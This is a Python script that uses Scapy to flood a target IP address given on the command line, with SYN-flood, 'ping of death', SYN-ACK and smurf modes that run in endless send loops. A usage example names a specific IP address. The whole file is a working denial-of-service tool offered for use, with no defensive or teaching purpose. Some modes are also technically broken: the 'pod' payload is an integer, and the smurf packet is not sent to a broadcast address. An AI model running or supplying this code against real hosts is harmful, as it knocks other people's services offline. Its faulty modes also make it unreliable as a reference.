import sys
from scapy.all import *
import ipaddress

def ddos(target_ip, attack_type, target_port=12345):
    if attack_type == "syn_flood":
        while(True):
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
    elif attack_type == "pod":
        while(True):
            load = 6000
            pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)
    elif attack_type == "syn_ack":
        while(True):
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)
    elif attack_type == "smurf":
        while(True):
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)
    else:
        print("Unknown attack type specified.")

if __name__ == "__main__":
    # Check for required arguments
    if len(sys.argv) < 3 or len(sys.argv) > 4:
        print("Usage: python3 script_name.py <target_ip> <attack_type> [<target_port>]")
        print("Example: python3 script_name.py 163.173.228.225 syn_flood 80")
        sys.exit(1)

    # Get target IP and attack type from command line arguments
    target_ip = sys.argv[1]
    attack_type = sys.argv[2]

    # Validate IP address
    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        print("Invalid IP address format.")
        sys.exit(1)

    # Get target port if provided, otherwise use default
    if len(sys.argv) == 4:
        try:
            target_port = int(sys.argv[3])
            if not (1 <= target_port <= 65535):
                raise ValueError
        except ValueError:
            print("Invalid port number. Please provide a port number between 1 and 65535.")
            sys.exit(1)
    else:
        target_port = 12345

    # Run the attack
    ddos(target_ip, attack_type, target_port)
